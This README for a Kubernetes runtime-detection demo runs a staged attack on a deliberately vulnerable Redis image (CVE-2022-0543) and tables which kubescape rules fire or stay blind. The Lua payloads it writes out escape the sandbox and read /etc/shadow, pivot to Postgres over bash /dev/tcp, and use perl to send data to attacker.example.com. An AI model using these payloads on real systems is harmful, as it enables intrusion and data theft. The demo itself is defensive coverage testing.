# Chain demo — single e2e multi-pod attack chain

A 4-component sbob demo that runs ONE realistic attack chain across the
namespace and produces a coverage table showing which detection rules
fired and which were silent. Both classes are demo features — the
silent ones map directly to operator knobs you can flip.

## The chain (one attacker, four stages, three pods involved)

```
                       ┌─ user / attacker ─┐
                       │      HTTP         │
                       ▼                   ▼
                   ┌─ chain-frontend ──────────────────┐
                   │  /api/products → backend          │   benign
                   │  /api/cache/eval → redis EVAL     │   *vulnerable feature*
                   └────────────┬───────────────┬──────┘
                                │ HTTP          │ RESP
                                ▼               ▼
            ┌─ chain-backend ──────────┐  ┌─ chain-redis (vulnerable image) ─┐
            │  /api/products → pg      │  │ Lua sandbox patched: io.popen()   │
            │                          │  │ reachable from EVAL.               │
            └──────────┬───────────────┘  │ During attack chain:               │
                       │ pg-wire           │   spawns: cat, bash, perl          │
                       ▼                   │   bash uses /dev/tcp → postgres    │
            ┌─ chain-postgres ─────────┐  │   perl uses IO::Socket → external  │
            │  postgres:16              │  └──────────────┬─────────────────────┘
            └───────────────────────────┘                 │ raw TCP (pg-wire bytes)
                       ▲                                  │ + outbound HTTP
                       │                                  ▼
                       └────── novel egress ──── attacker.example.com (exfil)
```

### Stage 1 · `s1-recon-benign-eval` — **BLIND by design**
Attacker confirms `/api/cache/eval` accepts arbitrary Lua by submitting
the same legitimate atomic-counter script that benign traffic uses.
`return redis.call("INCR", KEYS[1])`. Nothing fires — this is literally
the feature.

### Stage 2 · `s2-escape-sandbox-read-shadow` — **DETECTED**
Attacker submits Lua that:
1. Tries `io.popen` directly (succeeds — this is the chain-redis image's
   patched-Lua vulnerability).
2. Falls back to `package.loadlib('/usr/lib/liblua5.1.so.0','luaopen_io')`
   if direct access fails (covers vanilla redis with stricter sandbox).
3. `io.popen("cat /etc/shadow | head -c 200")` — spawns `cat` inside
   the redis pod and reads the sensitive file.

| Rule | Container | Trigger | Status |
|---|---|---|---|
| R0001 Unexpected process launched | redis | comm=`cat` not in AP | DETECTED |
| R0010 Unexpected Sensitive File Access | redis | `/etc/shadow` | DETECTED |

### Stage 3 · `s3-pivot-redis-as-pg-client` — **partially DETECTED**
Same sandbox escape, different popen target:
`io.popen("bash -c 'exec 3<>/dev/tcp/chain-postgres/5432; printf <pg-startup-bytes> >&3; head -c 30 <&3 | base64'")`
The redis pod now actively speaks pg-wire to postgres — the "redis as a
postgres client" pivot. `/bin/sh` is dash (no /dev/tcp); we explicitly
invoke `bash`.

| Rule | Container | Trigger | Status |
|---|---|---|---|
| R0001 Unexpected process launched | redis | comm=`bash` not in AP | DETECTED |
| R0011 Unexpected Egress Network Traffic | redis | postgres:5432 not in NN | **BLIND** — `networkEventsStreaming: disable` + R0011 `isTriggerAlert: false` |

### Stage 4 · `s4-exfil-to-internet` — **partially DETECTED**
Same escape, perl raw-socket to an external host:
`io.popen("perl -e 'use IO::Socket::INET; my $s=...; print $s qq{GET /?d=loot HTTP/1.0\\nHost:x\\n\\n}; ...'")`
Sends a small HTTP request to attacker.example.com — data leaves the
cluster.

| Rule | Container | Trigger | Status |
|---|---|---|---|
| R0001 Unexpected process launched | redis | comm=`perl` not in AP | DETECTED |
| R0005 DNS Anomalies in container | redis | DNS lookup of attacker.example.com | **BLIND** — `networkEventsStreaming: disable` |
| R0011 Unexpected Egress Network Traffic | redis | external:80 not in NN | **BLIND** — same as Stage 3 |

### Coverage summary

```
Coverage: 4 / 7 expected detections matched

s2 (escape+sensitive-read):   R0001 ✓  R0010 ✓
s3 (pivot via /dev/tcp):       R0001 ✓  R0011 ✗
s4 (exfil via perl):           R0001 ✓  R0005 ✗  R0011 ✗
```

**The 3 BLINDs are not bugs — they map to two operator knobs:**

- `kubescape/values.yaml: networkEventsStreaming: enable` (today: disable) →
  unblinds R0005 (s4-DNS) and R0011 (s3, s4 — provided the next knob also flips)
- `default-rules.yaml: R0011.isTriggerAlert: true` (today: false) →
  unblinds R0011 alerts in alertmanager

Flip both → 7/7 coverage. The demo's value is making the gap measurable.

## sbobs (learned by kubescape, exported under `sbobs/`)

| File | Highlights |
|---|---|
| `sbobs/ap-chain-frontend.yaml` | execs: `/chain-frontend` only (distroless Go binary) |
| `sbobs/nn-chain-frontend.yaml` | egress: kube-dns:53, chain-backend:8080, **chain-redis:6379** (EVAL traffic IS learned because /api/cache/eval is a legitimate feature) |
| `sbobs/ap-chain-backend.yaml` | execs: `/chain-backend` only |
| `sbobs/nn-chain-backend.yaml` | egress: kube-dns:53, chain-postgres:5432 (NO redis — backend doesn't talk to redis in this app) |
| `sbobs/ap-chain-redis.yaml` | execs: `/usr/local/bin/redis-server` only — every spawned binary (cat, bash, perl) is novel ⇒ R0001 fires reliably |
| `sbobs/nn-chain-redis.yaml` | egress: **empty** — every outbound is novel ⇒ R0011 *would* fire if `networkEventsStreaming` were enabled |
| `sbobs/ap-chain-postgres.yaml` | execs: 17 unique paths (postgres, psql, bash, sh, cat, find, …) |
| `sbobs/nn-chain-postgres.yaml` | egress: empty |

The narrow chain-redis sbob (one exec, zero egress) is what makes the
attack DETECTABLE in principle. The cluster's two-knob suppression is
what makes most of it BLIND in practice.

## Components

| Pod | Image | Role |
|---|---|---|
| `chain-frontend` | `ttl.sh/chain-frontend-<uuid>:24h` | ~180-LOC Go service: HTML + /api/products proxy + **/api/cache/eval RESP proxy** (legitimate atomic-counter feature, untrusted script content) |
| `chain-backend` | `ttl.sh/chain-backend-<uuid>:24h` | ~180-LOC Go service: serves /api/products from postgres |
| `chain-redis` | `ghcr.io/k8sstormcenter/redis-vulnerable:7.2.10` | Same patched-Lua image used by `example/redis-vulnerable.yaml` — CVE-2022-0543 reproduced (io reachable from EVAL) |
| `chain-postgres` | `postgres:16` | Upstream image, no customisation |

All images pull anonymously. The two custom Go services are built
locally and pushed to ttl.sh (24-hour ephemeral, no auth).

## Run it

Pre-req: kubescape + alertmanager already installed in the cluster.
(run `./scripts/local-ci.sh --setup-only` on any existing app if not.)

### Local dev flow (builds + pushes to ttl.sh)

```bash
./scripts/local-ci-chain.sh                  # full pipeline
./scripts/local-ci-chain.sh --setup-only     # deploy + learn 4 sbobs
./scripts/local-ci-chain.sh --attack-only    # re-run chain + coverage
./scripts/local-ci-chain.sh --teardown       # remove the chain namespace
```

### Stable-images flow (no docker required)

The `.github/workflows/ci-chain-images.yaml` workflow builds + pushes
both Go services to GHCR on every push to `main` / `feat/postgres-
endpoint-attacks` (or tag, or manual dispatch). Once published you can
run the demo without building anything locally:

```bash
./scripts/local-ci-chain.sh --use-published                  # uses :latest
CHAIN_PUBLISHED_TAG=abc1234 ./scripts/local-ci-chain.sh \
    --use-published                                          # pin a SHA
```

The published images are:

| Image | Tag policy |
|---|---|
| `ghcr.io/k8sstormcenter/chain-frontend` | `<short-sha>`, `<branch>`, `latest` (main only) |
| `ghcr.io/k8sstormcenter/chain-backend` | same |

Each publish runs the Go TDD test suite as a gate AND smoke-tests the
final image's `/healthz` before tagging — so a passing CI run means
the published image is at least runnable.

Expected end-of-run output:

```
SCENARIO                              RULE    CONTAINER  COMM    STATUS
s2-escape-sandbox-read-shadow         R0001   redis      cat     DETECTED
s2-escape-sandbox-read-shadow         R0010   redis              DETECTED
s3-pivot-redis-as-pg-client           R0001   redis      bash    DETECTED
s3-pivot-redis-as-pg-client           R0011   redis              BLIND
s4-exfil-to-internet                  R0001   redis      perl    DETECTED
s4-exfil-to-internet                  R0005   redis              BLIND
s4-exfil-to-internet                  R0011   redis              BLIND

Coverage: 4 / 7 expected detections matched
```

## Architecture choices

- **Single AttackSuite target = frontend.** Reuses `bobctl attack` verbatim
  for HTTP delivery. Every chain stage enters as one POST to
  `/api/cache/eval`. Detections happen wherever syscalls actually fire;
  `expectedDetections.containerName` tells the verifier which pod to
  look in.
- **Verifier is bash + jq, not Go.** `pkg/autotune` tuner restricts
  alerts to the baseline profile's containers — wrong shape for a
  cross-pod chain. A ~30-line bash verifier matches expectations
  against alertmanager's active alert set without touching `pkg/`.
- **chain-redis = the repo's redis-vulnerable image.** Vanilla redis:7.2
  hardens the Lua sandbox and the escape returns "sandbox_blocked".
  The patched image is the canonical "fileless vulnerability" precondition.
- **chain-postgres = postgres:16 upstream.** No custom image — postgres
  doesn't need to be vulnerable for this chain; postgres is the data
  source the chain exfils FROM.
- **ttl.sh for the two custom Go images.** 24h TTL, anonymous, zero
  registry babysitting.

## TDD discipline

- `backend/main_test.go` — 7 tests pinning backend behavior
- `frontend/main_test.go` — 7 tests pinning that /api/cache/eval forwards
  the Lua script VERBATIM (sanitising at the frontend layer would
  silently break the chain)
- Script's TDD gate runs `go test ./...` for both components before
  docker build — bad commits fail before reaching the cluster

## Files

```
example/chain/
├── README.md                      ← this file
├── chain.yaml                     ← 4 deployments + 4 services + 1 configmap
├── chain-attacks.yaml             ← AttackSuite (4 stages, 7 expectations)
├── chain-functional-tests.yaml    ← benign baseline (5 reqs for learning)
├── sbobs/                         ← realistic AP+NN exported from cluster
│   ├── ap-chain-{frontend,backend,redis,postgres}.yaml
│   └── nn-chain-{frontend,backend,redis,postgres}.yaml
├── frontend/                      ← Go service, isolated go.mod
│   ├── go.mod  go.sum
│   ├── main.go  main_test.go      ← /api/cache/eval forwards verbatim
│   └── Dockerfile
└── backend/                       ← Go service, isolated go.mod
    ├── go.mod  go.sum
    ├── main.go  main_test.go      ← serves /api/products
    └── Dockerfile

scripts/local-ci-chain.sh          ← orchestration (~220 LOC bash)
```

No edits to `pkg/`, no edits to existing `example/*` files, no new Go
package in the bobctl codebase.
